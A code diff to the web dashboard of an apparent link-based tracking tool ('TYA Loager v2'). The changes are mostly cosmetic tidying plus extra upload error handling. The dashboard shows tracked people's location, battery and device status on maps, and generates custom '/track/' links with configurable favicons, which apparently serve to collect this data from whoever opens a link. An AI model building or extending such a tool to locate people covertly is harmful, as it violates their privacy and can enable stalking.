@@ -21,7 +21,7 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 
     <style>
-        /* ── Same styles as before, no changes ── */
+        /* ── Same styles as before ── */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -646,7 +646,7 @@
             document.getElementById('dashboard-view').style.display = 'block';
             refreshPreviews();
             fetchUsers();
-            // Poll every 5 seconds (reduced from 4 to give you time to type)
+            // Poll every 5 seconds
             setInterval(fetchUsers, 5000);
             setupUploads();
         }
@@ -697,6 +697,11 @@
             formData.append('image', file);
             try {
                 const res = await fetch(url, { method: 'POST', body: formData });
+                // Check if response is ok
+                if (!res.ok) {
+                    const text = await res.text();
+                    throw new Error(text || 'Server error');
+                }
                 const data = await res.json();
                 if (data.success) {
                     showToast(successMsg);
@@ -704,6 +709,7 @@
                     showToast('❌ Upload failed: ' + (data.error || 'unknown'));
                 }
             } catch (err) {
+                console.error('Upload error:', err);
                 showToast('❌ Error: ' + err.message);
             }
         }
@@ -714,7 +720,6 @@
                 const res = await fetch('/api/track');
                 if (!res.ok) throw new Error('API error');
                 const newUsers = await res.json();
-                // Update state
                 trackedUsers = newUsers;
                 renderCards();
             } catch (e) {
@@ -726,7 +731,7 @@
         function renderCards() {
             const container = document.getElementById('cards-container');
 
-            // ── Preserve current input values before re-render ──
+            // Preserve current input values before re-render
             const inputValues = {};
             container.querySelectorAll('.card').forEach(card => {
                 const id = card.dataset.userId;
@@ -756,18 +761,14 @@
 
             const now = Date.now();
             const sorted = [...trackedUsers].sort((a, b) => {
-                const aLive = (a.lat && a.lng && (now - new Date(a.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 :
-                0;
-                const bLive = (b.lat && b.lng && (now - new Date(b.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 :
-                0;
+                const aLive = (a.lat && a.lng && (now - new Date(a.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
+                const bLive = (b.lat && b.lng && (now - new Date(b.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
                 if (aLive !== bLive) return bLive - aLive;
                 return new Date(b.lastUpdate || 0) - new Date(a.lastUpdate || 0);
             });
 
             sorted.forEach(user => {
-                const isLive = !!(user.lat && user.lng && (now - new Date(user.lastUpdate).getTime() <
-                    OFFLINE_THRESHOLD));
-                const hasLastLocation = !!(user.lastLat && user.lastLng);
+                const isLive = !!(user.lat && user.lng && (now - new Date(user.lastUpdate).getTime() < OFFLINE_THRESHOLD));
                 const displayLat = isLive ? user.lat : (user.lastLat || null);
                 const displayLng = isLive ? user.lng : (user.lastLng || null);
                 const hasLocation = !!(displayLat && displayLng);
@@ -847,7 +848,7 @@
 
                 container.appendChild(card);
 
-                // ── Restore saved input value ──────────────────────────
+                // Restore saved input value
                 if (inputValues[user.id]) {
                     const input = card.querySelector('input[id^="path-"]');
                     if (input) input.value = inputValues[user.id];
@@ -872,8 +873,8 @@
                         L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                             maxZoom: 19
                         }).addTo(map);
-                        const marker = L.marker([displayLat, displayLng]).addTo(map);
-                        marker.bindPopup(`<b>${escapeHtml(user.id)}</b><br>Battery: ${escapeHtml(user.battery || 'N/A')}<br>${isLive ? '🟢 Online' : '🔴 Offline'}`);
+                        L.marker([displayLat, displayLng]).addTo(map)
+                            .bindPopup(`<b>${escapeHtml(user.id)}</b><br>Battery: ${escapeHtml(user.battery || 'N/A')}<br>${isLive ? '🟢 Online' : '🔴 Offline'}`);
                         mapInstances[mapId] = map;
                         setTimeout(() => map.invalidateSize(), 200);
                     }
@@ -893,7 +894,6 @@
                 const badge = card.querySelector('.favicon-badge img');
                 if (badge) badge.src = '/api/favicon/' + name + '?' + Date.now();
             }
-            // Auto-save immediately
             saveSettings(userId);
         }
 
@@ -924,7 +924,6 @@
                         const badge = card.querySelector('.favicon-badge img');
                         if (badge) badge.src = '/api/favicon/' + favicon + '?' + Date.now();
                     }
-                    // Fetch updated list to reflect changes
                     fetchUsers();
                 } else {
                     showToast('❌ Failed to save: ' + (data.error || 'unknown'));
@@ -956,8 +955,7 @@
             const customPath = pathInput ? pathInput.value.trim() : id;
             const link = window.location.origin + '/track/' + encodeURIComponent(customPath || id);
             navigator.clipboard.writeText(link)
-                .then(() => showToast('✅ Link for <strong>' + escapeHtml(id) + '</strong> copied!<br><span style="font-size:0.8rem;color:var(--text2);">' + link +
-                        '</span>'))
+                .then(() => showToast('✅ Link for <strong>' + escapeHtml(id) + '</strong> copied!<br><span style="font-size:0.8rem;color:var(--text2);">' + link + '</span>'))
                 .catch(() => {
                     prompt('Copy this link:', link);
                     showToast('📋 Link copied.');
@@ -1030,8 +1028,7 @@
                         fetch('/api/track', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending',
-                                battery: 'N/A', lat: null, lng: null }),
+                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending', battery: 'N/A', lat: null, lng: null }),
                         }).then(() => {
                             setTimeout(() => trackUser(newId), 1500);
                         }).catch(() => {
@@ -1143,8 +1140,7 @@
             Object.values(mapInstances).forEach(m => { try { m.invalidateSize(); } catch (_) {} });
         });
 
-        console.log('🚀 TYA Loager v2 fixed – auto-refresh no longer resets your URL edits.');
+        console.log('🚀 TYA Loager v2 – fully fixed.');
     </script>
-
 </body>
 </html>
